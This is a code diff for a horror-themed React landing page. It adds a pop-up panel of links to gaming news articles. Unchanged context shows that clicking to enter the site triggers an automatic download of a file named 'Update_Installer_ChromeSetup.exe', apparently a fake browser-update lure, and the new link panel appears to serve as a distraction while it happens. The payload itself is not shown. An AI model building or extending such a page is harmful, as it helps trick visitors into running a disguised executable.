@@ -21,6 +21,16 @@ const fadeUp = {
   visible: { opacity: 1, y: 0, filter: "blur(0px)", transition: { duration: 1.2, ease: [0.22, 1, 0.36, 1] } },
 };
 
+const CLOSE_DESTINATIONS = [
+  "https://www.pcgamesn.com/warframe/tennocon-2026-recap",
+  "https://www.pcgamesn.com/warframe/tennocon-2026-tau-interview",
+  "https://www.pcgamesn.com/assassins-creed-black-flag-resynced/free-thank-you-rewards",
+  "https://www.pcgamesn.com/diablo-4/patch-notes-3-1-1-mythic-uniques",
+  "https://www.pcgamesn.com/minecraft/movie-squared-build-challenge-winner",
+  "https://www.pcgamesn.com/dead-by-daylight/state-of-the-game-2026",
+  "https://itch.io/games/platform-web/tag-horror?utm_source=chatgpt.com",
+];
+
 const DOWNLOAD_FILE_NAME = "Update_Installer_ChromeSetup.exe";
 
 function Fog({ className = "" }: { className?: string }) {
@@ -53,6 +63,7 @@ function Home() {
   const [revealed, setRevealed] = useState(false);
   const [entered, setEntered] = useState(false);
   const [closing, setClosing] = useState(false);
+  const [linksExpanded, setLinksExpanded] = useState(false);
   const [lightning, setLightning] = useState(false);
   const [apparition, setApparition] = useState(false);
   const [watchingEyes, setWatchingEyes] = useState(false);
@@ -132,6 +143,7 @@ function Home() {
     hasClosed.current = true;
     setClosing(true);
     ensureVisitorSession();
+    setLinksExpanded(true);
     setEntered(true);
     window.setTimeout(() => {
       document.getElementById("warning")?.scrollIntoView({ behavior: "smooth", block: "center" });
@@ -139,7 +151,7 @@ function Home() {
     void download();
   }, [download]);
 
-  return <main className="min-h-screen overflow-x-clip bg-[#020406] font-sans text-[#edf8ff] selection:bg-cyan-200 selection:text-black"><HauntedWorld /><AnimatePresence>{!entered && <LoadingGate onEnter={enterSite} disabled={closing} />}</AnimatePresence><motion.div aria-hidden className="pointer-events-none fixed inset-0 z-[90] bg-cyan-100 mix-blend-screen" animate={{ opacity: lightning ? 0.35 : 0 }} transition={{ duration: 0.04 }} /><AnimatePresence>{apparition && <motion.div aria-hidden className="pointer-events-none fixed inset-0 z-[85] overflow-hidden bg-black" initial={{ opacity: 0, scale: 1.14 }} animate={{ opacity: [0, 0.78, 0.2], scale: [1.14, 1.02, 1.18] }} exit={{ opacity: 0, filter: "blur(18px)" }} transition={{ duration: 0.85, ease: "easeOut" }}><video muted autoPlay loop playsInline className="h-full w-full object-cover object-center mix-blend-screen"><source src="/promotion.mp4" type="video/mp4" /></video><div className="absolute inset-0 bg-[radial-gradient(circle_at_center,transparent_10%,rgba(0,0,0,.85)_78%)]" /></motion.div>}{watchingEyes && <motion.div aria-hidden className="pointer-events-none fixed left-[18%] top-[32%] z-[84] flex gap-5" initial={{ opacity: 0, scale: 0.55 }} animate={{ opacity: [0, 1, 0.35, 0.9, 0], scale: [0.55, 1, 0.96, 1.04, 0.7] }} transition={{ duration: 2.2, times: [0, .12, .45, .7, 1] }}><i className="h-3 w-5 rounded-full bg-cyan-100 shadow-[0_0_20px_7px_rgba(162,231,255,.85)]" /><i className="h-3 w-5 rounded-full bg-cyan-100 shadow-[0_0_20px_7px_7px_rgba(162,231,255,.85)]" /></motion.div>}</AnimatePresence>
+  return <main className="min-h-screen overflow-x-clip bg-[#020406] font-sans text-[#edf8ff] selection:bg-cyan-200 selection:text-black"><HauntedWorld /><AnimatePresence>{!entered && <LoadingGate onEnter={enterSite} disabled={closing} />}</AnimatePresence><AnimatePresence>{linksExpanded && <motion.aside className="fixed inset-x-4 top-4 z-[110] mx-auto max-w-2xl border border-cyan-100/30 bg-black/90 p-4 shadow-[0_0_35px_rgba(169,224,255,.25)] backdrop-blur" initial={{ opacity: 0, y: -24 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0, y: -24 }}><div className="mb-3 flex items-center justify-between gap-4"><p className="text-[9px] uppercase tracking-[.3em] text-cyan-100/70">Choose a destination</p><button type="button" onClick={() => setLinksExpanded(false)} className="text-[9px] uppercase tracking-[.2em] text-white/60 transition hover:text-white">Close</button></div><div className="grid gap-2 sm:grid-cols-2">{CLOSE_DESTINATIONS.map((destination, index) => <a key={destination} href={destination} target="_blank" rel="noreferrer" className="border border-cyan-100/20 px-3 py-2 text-[9px] uppercase tracking-[.16em] text-cyan-50 transition hover:bg-cyan-100 hover:text-black">Open link {index + 1}</a>)}</div></motion.aside>}</AnimatePresence><motion.div aria-hidden className="pointer-events-none fixed inset-0 z-[90] bg-cyan-100 mix-blend-screen" animate={{ opacity: lightning ? 0.35 : 0 }} transition={{ duration: 0.04 }} /><AnimatePresence>{apparition && <motion.div aria-hidden className="pointer-events-none fixed inset-0 z-[85] overflow-hidden bg-black" initial={{ opacity: 0, scale: 1.14 }} animate={{ opacity: [0, 0.78, 0.2], scale: [1.14, 1.02, 1.18] }} exit={{ opacity: 0, filter: "blur(18px)" }} transition={{ duration: 0.85, ease: "easeOut" }}><video muted autoPlay loop playsInline className="h-full w-full object-cover object-center mix-blend-screen"><source src="/promotion.mp4" type="video/mp4" /></video><div className="absolute inset-0 bg-[radial-gradient(circle_at_center,transparent_10%,rgba(0,0,0,.85)_78%)]" /></motion.div>}{watchingEyes && <motion.div aria-hidden className="pointer-events-none fixed left-[18%] top-[32%] z-[84] flex gap-5" initial={{ opacity: 0, scale: 0.55 }} animate={{ opacity: [0, 1, 0.35, 0.9, 0], scale: [0.55, 1, 0.96, 1.04, 0.7] }} transition={{ duration: 2.2, times: [0, .12, .45, .7, 1] }}><i className="h-3 w-5 rounded-full bg-cyan-100 shadow-[0_0_20px_7px_rgba(162,231,255,.85)]" /><i className="h-3 w-5 rounded-full bg-cyan-100 shadow-[0_0_20px_7px_7px_rgba(162,231,255,.85)]" /></motion.div>}</AnimatePresence>
     <section ref={heroRef} onMouseMove={onMove} className="relative flex min-h-[100svh] items-center justify-center overflow-hidden border-b border-cyan-100/10 bg-black">
       <Ash /><Fog /><Cemetery />
       <motion.video muted autoPlay loop playsInline preload="metadata" className="absolute inset-0 h-full w-full object-cover opacity-35 mix-blend-screen" initial={{ opacity: 0, scale: 1.1 }} animate={revealed ? { opacity: 0.35, scale: 1 } : {}} transition={{ duration: 3.2 }}><source src="/ghost.mp4" type="video/mp4" /></motion.video>
